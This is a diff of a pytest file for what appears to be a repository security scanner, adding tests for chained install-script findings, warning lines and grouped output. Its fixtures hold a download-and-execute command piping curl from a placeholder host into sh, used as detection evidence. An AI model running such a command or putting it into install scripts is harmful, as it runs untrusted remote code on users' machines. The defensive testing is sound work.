@@ -8,6 +8,7 @@ from pathlib import Path
 import pytest
 
 from repovet.models import (
+    Chain,
     Confidence,
     CoverageItem,
     CoverageStatus,
@@ -17,7 +18,7 @@ from repovet.models import (
     Severity,
 )
 from repovet.report import terminal
-from repovet.report.common import group_findings, top_groups
+from repovet.report.common import action_line, group_findings, top_groups
 from repovet.report.terminal import (
     color_wanted,
     no_findings,
@@ -86,12 +87,48 @@ def sample_result(findings: list[Finding]) -> ScanResult:
 
 
 def sample_findings() -> list[Finding]:
+    chain = Chain("chain-1", (Location("package.json", 3), Location("x.js"), Location("x.sh", 2)))
     return [
         finding(
             "RC-AUTO-001",
             Severity.MEDIUM,
             "package.json",
             message="package.json defines a 'postinstall' script: node x.js",
+            in_chain="chain-1",
+            tags=("npm", "install"),
+        ),
+        finding(
+            "RC-DLX-001",
+            Severity.MEDIUM,
+            "x.sh",
+            area="download_exec",
+            location=Location("x.sh", 2),
+            message="Downloads and runs code in one step: curl -s https://example.invalid/x | sh",
+            evidence="curl -s https://example.invalid/x | sh",
+            in_chain="chain-1",
+            tags=("download", "exec"),
+        ),
+        finding(
+            "RC-AUTO-090",
+            Severity.HIGH,
+            "package.json",
+            message="npm install script runs on install and reaches download-and-execute "
+            "(RC-DLX-001) after 3 steps: package.json -> x.js -> x.sh",
+            evidence="curl -s https://example.invalid/x | sh",
+            chain=chain,
+            tags=("chain", "autorun"),
+        ),
+        *(
+            finding(
+                "RC-AGENT-001",
+                Severity.INFO,
+                path,
+                area="agents",
+                location=Location(path),
+                message=f"AI agent file: {path}",
+                title="AI agent file present",
+            )
+            for path in ("AGENTS.md", "CLAUDE.md")
         ),
         finding(
             "RC-AGENT-002",
@@ -145,7 +182,7 @@ def test_no_findings_wording() -> None:
 def test_min_severity_hides_and_counts() -> None:
     text = render(sample_result(sample_findings()), min_severity=Severity.HIGH)
     assert "RC-AUTO-001" not in text
-    assert "2 finding(s) below 'high' not shown" in text
+    assert "5 finding(s) below 'high' not shown" in text
 
 
 def many(count: int) -> list[Finding]:
@@ -194,7 +231,8 @@ def test_look_first_prefers_findings_outside_tests_at_the_same_level() -> None:
 
 def test_summary_box_counts_every_level() -> None:
     text = render_summary(sample_result(sample_findings()))
-    assert "1 critical · 2 high · 1 medium · 1 low · 0 info" in text
+    # The two parts of the chain are not counted again.
+    assert "1 critical · 3 high · 0 medium · 1 low · 2 info" in text
     assert "Look at these first" in text
     assert all(len(line) == 79 for line in text.splitlines()[1:])
     only_info = render_summary(sample_result([finding("RC-AGENT-001", Severity.INFO, "a.md")]))
@@ -239,7 +277,7 @@ def test_ascii_mode_replaces_decorations() -> None:
     assert header == (
         "repovet 0.1.0 | local folder D:\\src\\demo | offline | 1,284 files | 3 rules"
     )
-    assert "1 critical | 2 high | 1 medium" in text
+    assert "1 critical | 3 high | 0 medium" in text
     assert "+- SUMMARY -" in text
     assert "\u00b7" not in text
     assert "\u2026" not in text
@@ -280,3 +318,44 @@ def test_supports_unicode() -> None:
     assert not supports_unicode(_Stream("cp850"))
     assert not supports_unicode(_Stream("no-such-codec"))
     assert not supports_unicode(_Stream(None))
+
+
+def test_action_line_from_the_worst_findings() -> None:
+    vscode = finding("RC-AUTO-020", Severity.HIGH, "a/tasks.json", tags=("vscode", "ide"))
+    low = finding("RC-AUTO-002", Severity.LOW, "package.json", tags=("npm", "install"))
+    assert action_line([vscode, low]) == (
+        "Do not open this folder in VS Code with trust (use Restricted Mode) until you have "
+        "read the findings below."
+    )
+    # A chain stands for its parts: the entry point (npm) and the code it reaches.
+    findings = sample_findings()
+    chain_only = [f for f in findings if f.rule_id in {"RC-AUTO-090", "RC-AUTO-001", "RC-DLX-001"}]
+    assert action_line(chain_only) == (
+        "Do not install its dependencies or run its install scripts; do not run its scripts "
+        "or code until you have read the findings below."
+    )
+    assert action_line([low]) is None
+    assert action_line([finding("RC-TRUST-001", Severity.HIGH, None, category="trust")]) is None
+
+
+def test_info_findings_are_one_line_per_rule_unless_details() -> None:
+    findings = [
+        finding("RC-AGENT-001", Severity.INFO, f"d{n}/AGENTS.md", title="AI agent file present")
+        for n in range(8)
+    ]
+    compact = render(sample_result(findings))
+    assert "  INFO      RC-AGENT-001  8 places: AI agent file present" in compact
+    assert "d0/AGENTS.md" not in compact
+    detailed = render(sample_result(findings), details=True)
+    assert all(f"d{n}/AGENTS.md:3" in detailed for n in range(8))
+
+
+def test_one_group_per_rule_with_the_title_when_messages_differ() -> None:
+    findings = [
+        finding("RC-DLX-001", Severity.MEDIUM, f"s{n}.sh", message=f"Downloads {n}")
+        for n in range(7)
+    ]
+    text = render(sample_result(findings))
+    assert "7 places" in text
+    assert "            Title\n" in text
+    assert "+2 more (--details)" in text
